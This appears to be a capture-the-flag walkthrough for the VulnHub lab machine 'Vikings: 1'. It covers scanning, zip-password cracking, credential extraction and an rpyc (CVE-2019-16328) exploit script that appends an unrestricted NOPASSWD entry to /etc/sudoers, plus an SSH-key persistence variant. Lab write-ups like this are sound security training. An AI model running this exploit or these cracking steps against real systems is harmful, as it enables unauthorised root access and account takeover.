## Vikings

| **Platform**   | VulnHub       |
| -------------- | ------------- |
| **Machine**    | Vikings: 1    |
| **Creator**    | lucky thandel |
| **OS**         | Linux         |
| **Difficulty** | --            |

use `netdiscover` to find the target VM, then use `Nmap`.

~~~
nmap -vv -sV 10.0.2.29
~~~

| Port | Service | Details                                                       |
| ---- | ------- | ------------------------------------------------------------- |
| 22   | SSH     | OpenSSH 7.6p1  Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) |
| 80   | HTTP    | Apache httpd 2.4.29                                           |

enumerate directories with gobuster.

~~~
gobuster dir -u http://10.0.2.29/site/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,zip,bak 
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.0.2.29/site/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              html,txt,zip,bak,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
index.html           (Status: 200) [Size: 4419]
images               (Status: 301) [Size: 312] [--> http://10.0.2.29/site/images/]
css                  (Status: 301) [Size: 309] [--> http://10.0.2.29/site/css/]
js                   (Status: 301) [Size: 308] [--> http://10.0.2.29/site/js/]
war.txt              (Status: 200) [Size: 13]
Progress: 317741 / 1323348 (24.01%)
~~~


go to the `war.txt` directory, which contains a hint:

~~~
/war-is-over
~~~

it's another directory. in there is a **base64** encoded large string, which when decoded reveals a zip file.
~~~
curl http://10.0.2.29/site/war-is-over/ | base64 -d > output
~~~

the zip file requires a password, use `zip2john` to extract a hash which can be cracked w/ `johntheripper`.

~~~
$ zip2john output > hash_output.txt    
$ john --wordlist=/usr/share/wordlists/rockyou.txt /home/m0th/hash_output.txt

ragnarok123
~~~


in the folder is an image. use `binwalk` to extract the embedded contents.

~~~
binwalk -e /home/m0th/output/king

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
1429567       0x15D03F        Zip archive data, at least v2.0 to extract, compressed size: 53, uncompressed size: 92, name: user

WARNING: One or more files failed to extract: either no utility was found or it's unimplemented
~~~
in the exctracted file `user` is what looks like credentials.
~~~
//FamousBoatbuilder_floki@vikings                                     
//f@m0usboatbuilde7 
~~~


ssh as **floki**, get some clues and read the user flag along the way.
~~~
floki@vikings:~$ cat readme.txt
_______________________________________________________________________Floki-Creation____________________________________________________________________________________________________


I am the famous boat builder Floki. We raided Paris this with our all might yet we failed. We don't know where Ragnar is after the war. He is in so grief right now. I want to apologise to him.
Because it was I who was leading all the Vikings. I need to find him. He can be anywhere. 
I need to create this `boat` to find Ragnar

floki@vikings:~$ cat boat
#Printable chars are your ally.
#num = 29th prime-number.
collatz-conjecture(num)

floki@vikings:/home/ragnar$ cat user.txt
~~~


the 29th prime number is 109, and googling the [Collatz conjecture](https://en.wikipedia.org/wiki/Collatz_conjecture) nets us a formula to use.

```math
f(n)= \begin{cases} n/2 \quad \text{if } n \equiv 0 \pmod {2} \\
n*3+1 \quad \text{if } n \equiv 1 \pmod{2} \end{cases}
```

i wrote a simple Python script to print out a sequence string, which, when decoded from decimal can be used as a password for user **ragnar**.

~~~
n = 109
output = str(n)+" "

while n > 1:
  if n%2==0:
    n = n//2
  else:
    n = n*3+1
  if n < 256:
    output += str(n)
    output += " "

print(output)
~~~


in `.profile`, we find a command with sudo:
~~~
ragnar@vikings:~$ cat .profile
# ~/.profile: executed by the command interpreter for login shells.
# This file is not read by bash(1), if ~/.bash_profile or ~/.bash_login
# exists.
# see /usr/share/doc/bash/examples/startup-files for examples.
# the files are located in the bash-doc package.

# the default umask is set in /etc/profile; for setting the umask
# for ssh logins, install and configure the libpam-umask package.
#umask 022
sudo python3 /usr/local/bin/rpyc_classic.py
~~~


`rpyc_classic` has a [known vulnerability](https://nvd.nist.gov/vuln/detail/cve-2019-16328).
here's a script i made that adds ragnar into sudoers with unlimited sudo (you only get one chance here, as far as i know if the file gets misconfigured there's no way to get it clean again)

[docs](https://rpyc.readthedocs.io/en/latest/api/utils_classic.html#rpyc.utils.classic.teleport_function)

~~~
import rpyc

def write_sudo():
    import os
    os.system('echo "ragnar ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers')
    
conn = rpyc.classic.connect("localhost")
fn = conn.teleport(write_sudo)
fn()

~~~

write the exploit into a file on the victim machine with nano, run it and sudo su to get the root flag.

~~~
ragnar@vikings:~$ sudo -l
[sudo] password for ragnar: 
Sorry, user ragnar may not run sudo on vikings.
ragnar@vikings:~$ nano give.py
ragnar@vikings:~$ python3 give.py
ragnar@vikings:~$ sudo -l
Matching Defaults entries for ragnar on vikings:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User ragnar may run the following commands on vikings:
    (ALL) NOPASSWD: ALL
ragnar@vikings:~$ sudo su
root@vikings:/home/ragnar# cd ~
root@vikings:~# cat root.txt
~~~

alternatively, using the same principle,
generate an ssh key pair on the attacker machine, and add the public key to **ragnar**'s `authorized_keys`. use a script to write it into `/root/.ssh` and `ssh -i` with the private key of the pair to get root access and read the final flag. 


#### MITRE ATT&CK Mapping

| **Actions**             | **Step**                                                | **Technique**                                                      |
| ----------------------- | ------------------------------------------------------- | ------------------------------------------------------------------ |
| Service discovery       | Scan with Nmap                                          | T1595 Active scanning                                              |
| Web content discovery   | Directory enumeration with Gobuster                     | T1595.003 Active Scanning: Wordlist Scanning                       |
| Access hidden file      | Access `war.txt`                                        | T1594  Search Victim-Owned Websites                                |
| Access hidden directory | Access `/war-is-over/`                                  | T1594 Search Victim-Owned Websites                                 |
| Credential Access       | Use `johntheripper` to obtain password for the zip file | T1110.002 Brute Force: Password Cracking                           |
| Credential Access       | Use `binwalk` to extract data from image                | T1078.003                                                          |
| Initial Access          | ssh as floki                                            | T1078.003 Valid Accounts: Local Accounts                           |
| Lateral Movement        | reconstruct password from hint, change over to ragnar   | T1078.003 Valid Accounts: Local Accounts                           |
| Privilege Escalation    | modify sudoers file, sudo su                            | T1548.003 Abuse Elevation Control Mechanism: Sudo and Sudo Caching |
| Privilege Escalation    | modify authorized_keys                                  | T1098.004 Account Manipulation: SSH Authorized Keys                |


#### OWASP Vulnerability Table

| **Vulnerability**         | **Impact**                                                         |
| ------------------------- | ------------------------------------------------------------------ |
| Broken Access Control     | war.txt, /war-is-over/ found, zip downloaded                       |
| Insecure Design           | credentials obtained from zip file; credentials obtained from hint |
| Security Misconfiguration | process exploited, root obtained                                   |
